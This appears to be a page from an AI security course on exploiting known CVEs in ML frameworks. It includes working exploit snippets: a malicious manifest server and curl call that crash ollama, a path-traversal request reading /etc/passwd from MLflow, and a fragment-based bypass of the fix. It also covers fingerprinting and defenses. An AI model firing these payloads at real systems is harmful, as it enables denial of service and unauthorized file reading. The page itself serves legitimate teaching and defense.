# Vulnerable Framework Code

> **In one sentence:** The popular ML frameworks and servers (ollama, MLflow, TorchServe) ship real, exploitable CVEs, so a known-vulnerable dependency in the ML stack hands an attacker DoS, arbitrary file read, or full RCE with off-the-shelf payloads.

## What it is

This is the supply-chain-by-dependency angle. You are not attacking the model or writing a novel exploit. You are identifying the framework and version behind a deployment and firing a known CVE at it. ML frameworks are large, fast-moving, and historically under-hardened, so this is one of the highest-yield paths against an AI system.

## The problem it exploits

- **Unsafe deserialization** of model manifests and config (pickle, SnakeYAML) leading to code execution.
- **Path traversal / LFI** in artifact and file-handling endpoints.
- **Incorrect input validation** (an array-length check that can be tricked into an out-of-bounds slice, crashing the server).
- **Incomplete fixes:** a patch that blocks one injection vector (query string) but misses another (URL fragment), reopening the same bug.
- **Poor patch management:** the deployment simply runs an outdated version.

## Intuition

An ML server is a house built from prefabricated parts ordered from a catalog. When the catalog publishes "part model 2.7.1 has a faulty lock," every house using that exact part is now openable with the published trick. You do not need to invent anything; you look up the part number (the version) and grab the matching key (the CVE exploit).

## How it works

Three worked examples from the course, each a different bug class:

**CVE-2025-1975: DoS in ollama (<= 0.5.11).** A malicious server returns a manifest with an empty layer object; an incorrect array-size check causes a slice out of range and the ollama server panics.

```python
# malicious manifest server
@app.route("/v2/dos/model/manifests/latest")
def exploit():
    return {"layers": [{}]}     # empty object -> crash
```

```bash
curl -X POST -H 'Content-Type: application/json' \
  -d '{"model": "http://localhost:5000/dos/model", "insecure": true}' \
  http://localhost:11434/api/pull
# -> panic: slice bounds out of range
```

**CVE-2023-6909: LFI in MLflow 2.7.1.** Path traversal in artifact handling. Create an experiment with an `artifact_location` containing `../` sequences, create a run and a model, link the model with `source: file:///`, then read arbitrary files:

```bash
curl 'http://TARGET:8080/model-versions/get-artifact?path=etc/passwd&name=pwn_model&version=1'
```

**CVE-2024-1594: bypass of the CVE-2023-6909 fix (MLflow 2.9.2).** The fix checked for `..` in the query string but not in the URL fragment (`#`), so the same traversal works through the fragment:

```
artifact_location: "http://#../../../../../../../../../etc/"   -> works
```

The lesson: a partial fix breeds a false sense of security. Validation must cover every injection vector, not just the first one reported.

For the RCE-grade version of this class (TorchServe ShellTorch: exposed management API + SSRF + SnakeYAML deserialization), see [model-tampering-deployment](model-tampering-deployment.md).

## Threat model and prerequisites

- **Access:** network reach to the framework's API or the ability to make the framework fetch from a server you control.
- **Knowledge:** the framework and version (fingerprint via banners, error messages, default ports such as 11434 for ollama, 8080 for MLflow, 8081 for TorchServe management).
- **Prerequisite:** the target runs a vulnerable, unpatched version.

## When to use it

- Whenever you can identify the ML serving stack and its version.
- After recon reveals a management or artifact API exposed on the network.
- To demonstrate patch-management gaps and supply-chain risk in the ML pipeline.

## Step by step with the toolkit

There is no dedicated toolkit script for framework CVEs; they are exploited with `curl` and small helper servers per the course methodology. The closest toolkit relevance is `app_system/model_tampering.py` for the serialization/deserialization and integrity side.

Fingerprint and enumerate:

```bash
# identify service and version via banners / errors
curl -i http://TARGET:11434/            # ollama
curl -i http://TARGET:8080/             # MLflow
curl -i http://TARGET:8081/             # TorchServe management API
```

Then run the matching CVE flow (examples above): a Flask server for the ollama DoS, the four-step experiment/run/model chain for the MLflow LFI, or the fragment variant for the bypass.

Serialization side with the toolkit (verify whether a model file loads code unsafely, and diff/fingerprint artifacts):

```bash
python -m app_system.model_tampering --mode fingerprint --model model.pt
python -m app_system.model_tampering --mode diff --model clean.pt --model-b suspect.pt
```

See [model-tampering-deployment](model-tampering-deployment.md) for the pickle RCE pattern and the full ShellTorch chain.

## Detection and defense

- **Patch management:** update frameworks and their transitive dependencies immediately; this is the single most effective control.
- **Dependency and vulnerability scanning** in CI to catch known-vulnerable versions before deploy.
- **Exhaustive input validation:** validate every URL vector (query string, path, and fragment) so incomplete fixes like CVE-2024-1594 do not slip through.
- **Access control and network isolation:** do not expose management/artifact APIs publicly; require authentication; restrict outbound fetches with allow-lists.
- **Reproducible, minimal builds** to shrink the vulnerable surface.

## Explain it to a non-expert

The AI runs on standard building-block software, and security researchers keep finding flaws in those blocks and publishing them. If a company keeps running an old, flawed block, anyone can look up the published flaw and use it to crash the service, read private files, or take over the machine. The defense is unglamorous but decisive: keep the building blocks up to date.

## References

- Course material: `07-attacking-ai-app-system/03_attacking_the_system/3_Vulnerable_framework_code`
- CVE-2025-1975 (ollama DoS), CVE-2023-6909 and CVE-2024-1594 (MLflow LFI and bypass)
- OWASP (2025) - LLM03:2025 Supply Chain
- Related toolkit pages: [model-tampering-deployment](model-tampering-deployment.md), [00-overview](00-overview.md)
